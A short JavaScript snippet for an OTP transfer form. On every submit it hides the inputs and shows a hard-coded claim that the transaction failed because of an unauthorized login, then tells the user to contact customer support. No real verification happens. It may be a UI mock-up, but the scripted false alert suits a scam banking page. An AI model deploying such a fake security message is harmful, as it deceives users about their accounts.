document.addEventListener('DOMContentLoaded', () => {
  const completeOtpForm = document.getElementById('completeOtpForm');
  const thankYouMessage = document.getElementById('thankYouMessage');
  const otpInputsContainer = completeOtpForm.querySelector('.inputptcode');
  const completeTransferButton = completeOtpForm.querySelector('button');

  completeOtpForm.addEventListener('submit', (event) => {
    event.preventDefault();

    // Hide the OTP inputs container and button
    otpInputsContainer.style.display = 'none';
    completeTransferButton.style.display = 'none';

    // Display the failure message
    thankYouMessage.innerText =
      'Transaction failed, we recognized a log in attempt from an unauthorized location. Please contact customer support for further details…';
    thankYouMessage.style.display = 'block';
  });
});
